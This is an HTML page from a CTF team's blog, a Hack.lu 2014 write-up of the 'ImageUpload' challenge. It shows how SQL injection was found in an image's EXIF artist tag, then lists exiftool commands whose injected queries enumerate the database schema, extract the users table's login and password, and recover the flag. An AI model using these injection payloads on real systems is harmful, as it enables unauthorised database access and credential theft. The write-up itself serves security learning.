@@ -1,0 +1,332 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Hack.lu 2014 - ImageUpload - CaptchaFlag CTF Team</title>
+  <meta name="author" content="Captchaflag">
+
+  
+  <meta name="description" content="Challenge In the Wild Wild Web, there are really bad guys. The sheriff doesn&#8217;t know them all. Therefore, he needs your help.
+Upload pictures of &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://www.captchaflag.com/blog/2014/10/24/hack-dot-lu-2014-imageupload/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="/atom.xml" rel="alternate" title="CaptchaFlag CTF Team" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+  <script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', 'UA-37376887-1']);
+    _gaq.push(['_trackPageview']);
+
+    (function() {
+      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+  </script>
+
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">CaptchaFlag CTF Team</a></h1>
+  
+    <h2>Blog by the Captchaflag CTF Team</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:www.captchaflag.com" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Hack.lu 2014 - ImageUpload</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-10-24T09:25:00-04:00" pubdate data-updated="true">Oct 24<span>th</span>, 2014</time>
+        
+         | <a href="#disqus_thread">Comments</a>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><h2>Challenge</h2>
+
+<p>In the Wild Wild Web, there are really bad guys. The sheriff doesn&#8217;t know them all. Therefore, he needs your help.
+Upload pictures of criminals to this site and help the sheriff to arrest them.
+You can make this Wild Wild Web much less wild!!!</p>
+
+<p>Pictures will be deleted on regular basis!</p>
+
+<h2>Analysis</h2>
+
+<p>The site is two separate pages. One is a simple submit form in which you upload an image to the site. It explicitly asks for .jpg or .jpeg images. The second page is a simple login form that has a valid username of <code>sheriff</code>, that can be detected based on differentiating responses of failed logins (invalid user vs invalid password).</p>
+
+<p>The form submissions explicitly asks for .jpg or .jpeg images, however if you rename the extension of another file type it appears to pass but
+has issues printing. After uploading the image, it displays three exif tags: <code>author</code>, <code>manufacturer</code>, and <code>model</code>. These tags, along with heigh tand width information are displayed in a table beneath the image.</p>
+
+<p>First attempts were to embed javascript into exif tags using exiftool, assuming a sheriff user would login to view the criminals. The values appear to be HTML encoded, however providing a single quote led to a database error. Looks like SQL injection.</p>
+
+<p>Here is the list of modifications I made to my jpeg to get info from the database:</p>
+
+<ul>
+<li><code>exiftool &quot;-artist=stacks0n&quot; hack.jpg</code>
+
+<ul>
+<li>ensure existence of Author field</li>
+</ul></li>
+<li><code>exiftool &quot;-artist=Artist','Manufacturer','Model') -- &quot; hack.jpg</code>
+
+<ul>
+<li>test injection</li>
+</ul></li>
+<li><code>exiftool -artist=Artist','Manufacturer',concat('a','b')) -- &quot; hack.jpg</code>
+
+<ul>
+<li>test for MySQL</li>
+</ul></li>
+<li><code>exiftool &quot;-artist=Artist','Manufacturer',(SELECT count(table_name) FROM information_schema.tables )) -- &quot; hack.jpg</code>
+
+<ul>
+<li>get number of tables (43)</li>
+</ul></li>
+<li><code>exiftool &quot;-artist=Artist','Manufacturer',(SELECT table_name FROM information_schema.tables LIMIT 42,1 )) -- &quot; hack.jpg</code>
+
+<ul>
+<li>get table name (users)</li>
+</ul></li>
+<li><code>exiftool &quot;-artist=Artist','Manufacturer',(SELECT column_name FROM information_schema.columns where table_name = 'users' LIMIT 0,1  )) -- &quot; hack.jpg</code>
+
+<ul>
+<li>get column names (id, name, password)</li>
+</ul></li>
+<li><code>exiftool &quot;-artist=Artist',(SELECT name from users where id = 1 ),(SELECT password from users where id = 1 )) -- &quot; hack.jpg</code>
+
+<ul>
+<li>get login info (sheriff, AO7eikkOCucCFJOyyaaQ)</li>
+</ul></li>
+</ul>
+
+<p>Lastly, login as sheriff for flag.</p>
+
+<h2>Solution</h2>
+
+<p>You are sucessfully logged in.</p>
+
+<p>Flag: flag{1_5h07_7h3_5h3r1ff}</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">stacks0n</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-10-24T09:25:00-04:00" pubdate data-updated="true">Oct 24<span>th</span>, 2014</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/sqli/'>sqli</a>, <a class='category' href='/blog/categories/web/'>web</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://www.captchaflag.com/blog/2014/10/24/hack-dot-lu-2014-imageupload/" data-via="captchaflag" data-counturl="http://www.captchaflag.com/blog/2014/10/24/hack-dot-lu-2014-imageupload/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/10/23/hack-dot-lu-2014-wiener/" title="Previous Post: Hack.lu 2014 - wiener">&laquo; Hack.lu 2014 - wiener</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2014/10/24/hack-dot-lu-2014-douchemac/" title="Next Post: Hack.lu 2014 - Douchemac">Hack.lu 2014 - Douchemac &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/10/28/hack-dot-lu-2014-guess-the-flag/">Hack.lu 2014 - Guess the Flag</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/10/24/hack-dot-lu-2014-daltons-corporate-security-safe-for-business/">Hack.lu 2014 - Dalton's Corporate Security Safe for Business</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/10/24/hack-dot-lu-2014-douchemac/">Hack.lu 2014 - Douchemac</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/10/24/hack-dot-lu-2014-imageupload/">Hack.lu 2014 - ImageUpload</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/10/23/hack-dot-lu-2014-wiener/">Hack.lu 2014 - wiener</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+<section>
+  <h1>Latest Tweets</h1>
+  <ul id="tweets">
+    <li class="loading">Status updating...</li>
+  </ul>
+  <script type="text/javascript">
+    $.domReady(function(){
+      getTwitterFeed("captchaflag", 4, false);
+    });
+  </script>
+  <script src="/javascripts/twitter.js" type="text/javascript"> </script>
+  
+    <a href="http://twitter.com/captchaflag" class="twitter-follow-button" data-show-count="false">Follow @captchaflag</a>
+  
+</section>
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - Captchaflag -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'captchaflag';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://www.captchaflag.com/blog/2014/10/24/hack-dot-lu-2014-imageupload/';
+        var disqus_url = 'http://www.captchaflag.com/blog/2014/10/24/hack-dot-lu-2014-imageupload/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = 'http://' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
